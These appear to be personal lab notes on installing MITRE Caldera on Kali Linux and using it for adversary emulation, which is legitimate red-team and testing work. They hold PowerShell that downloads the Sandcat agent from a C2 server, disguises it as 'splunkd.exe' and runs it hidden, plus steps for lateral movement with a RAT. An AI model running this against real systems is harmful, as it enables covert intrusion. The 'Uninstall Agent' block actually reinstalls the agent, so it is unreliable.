# Install Caldera on Kali Linux

- MITRE Caldera v5 Youtube Playlist https://www.youtube.com/watch?v=prJ5EZHh9go&list=PLF2bj1pw7-ZvLTjIwSaTXNLN2D2yx-wXH

## Install Caldera

- The --build flag is required the first time you run the server to bundle the UI dependencies
- python3 server.py --insecure --build

```
sudo apt install -y python3-venv
cd ~/caldera
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
python server.py --insecure --build

```


### Start Caldera again

```
cd ~/caldera
python3 -m venv venv
source venv/bin/activate
python server.py --insecure 
```

```

sudo systemctl daemon-reload
sudo systemctl restart caldera
sudo systemctl status caldera

https://localhost:8888    admin / admin
```

### Clone Atomic Red Team

```
cd caldera/plugins/atomic/data
git clone https://github.com/redcanaryco/atomic-red-team.git

Ensure the folder is named exactly atomic-red-team
Filter by Source: In the Caldera UI, go to Abilities and filter by the "atomic" repository to see the imported tests.
```



## Install agent on Windows


```
Set-ExecutionPolicy Bypass -Scope Process -Force
Unblock-File .\sandcat.exe
Test-NetConnection 192.168.1.47 -Port 8888

$server="http://192.168.1.47:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

```


## Uninstall Agent

```

get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -Force
Remove-Item "C:\Users\Public\splunkd.exe" -Force -ErrorAction Ignore

$server="http://192.168.1.47:8888"
$url="$server/file/download"

# Create WebClient and add required headers
$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")

# Download the agent
$data = $wc.DownloadData($url)

# Write executable to disk
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data)

# Start the agent pointing to server and group
Start-Process -FilePath "C:\Users\Public\splunkd.exe" -ArgumentList "-server $server -group red" -WindowStyle hidden

Get-Process splunkd

```

## uninstall Caldera

```                                                     
#!/usr/bin/env bash
# MITRE CALDERA Uninstall Script
# Run as a user with sudo privileges

set -euo pipefail

USER_HOME="${HOME}"
CALDERA_HOME="$USER_HOME/caldera5"
VENV_PATH="$USER_HOME/caldera_venv"
SERVICE_PATH="/etc/systemd/system/caldera.service"

echo "Stopping CALDERA service..."
sudo systemctl stop caldera || true
sudo systemctl disable caldera || true

echo "Removing systemd service..."
sudo rm -f "$SERVICE_PATH"
sudo systemctl daemon-reload

echo "Removing CALDERA directory..."
rm -rf "$CALDERA_HOME"

echo "Removing Python virtual environment..."
rm -rf "$VENV_PATH"

echo "Optional: Remove plugins directory if separate (usually inside $CALDERA_HOME)"
# rm -rf "$USER_HOME/caldera5/plugins"

echo "CALDERA has been uninstalled."

```

## Windows Lateral Movement

**References:**
- [MITRE Caldera – Lateral Movement Guide](https://caldera.readthedocs.io/en/latest/Lateral-Movement-Guide.html)
- [Atomic Red Team – T1570](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1570/T1570.md)

---

To set up MITRE Caldera for Windows lateral movement, you must satisfy specific **fact** requirements — such as the target host's FQDN — before launching an operation that uses a lateral movement adversary profile.

---

## 1. Deploy the Initial Agent

You need a **foothold** agent on the network with administrative privileges.

- Navigate to the **Agents** tab in the Caldera UI.
- Deploy the **Sandcat (54ndc47)** agent for Windows.
- Copy the provided PowerShell command and run it on your initial Windows target.

---

## 2. Configure a Fact Source

Caldera's lateral movement abilities (found in the **Stockpile** plugin) require target information — such as an IP address or FQDN — to be defined as a **fact**.

- Go to **Advanced > Sources** and create a new source (e.g., `SC Source`).
- Add a fact with the name `remote.host.fqdn` and set the value to the FQDN of the machine you want to move to.

---

## 3. Select a Lateral Movement Profile

You must use an adversary profile that contains lateral movement TTPs.

- Go to **Campaigns > Adversaries** and select a profile such as **Service Creation Lateral Movement**.
- This profile typically uses abilities that upload a remote access tool (RAT) and then execute it on the target host.

---

## 4. Start the Operation

- Go to **Campaigns > Operations** and click **Add**.
- **Basic Options:** Select the group containing your initial agent and the lateral movement adversary profile.
- **Autonomous Options:** Select *Use [Your Source Name] facts* to provide the target FQDN to the operation.
- Start the operation. If successful, a new agent will appear in your agent list on the target host.

For more detailed technical walkthroughs, refer to the [Windows Lateral Movement Guide](https://caldera.readthedocs.io/en/latest/Lateral-Movement-Guide.html) in the official MITRE Caldera Documentation.

---

## Recommended Starting TTPs

**Service Creation (T1543.003)** and **WMI (T1047)** are the most reliable techniques for testing Windows environments.

Before running an operation, verify the following:

- **Network connectivity** is open between your foothold and target hosts (ports **445** and **135**).
- Your **Fact Source** includes a valid `domain.user.password` fact if you are not operating in the context of the current user.

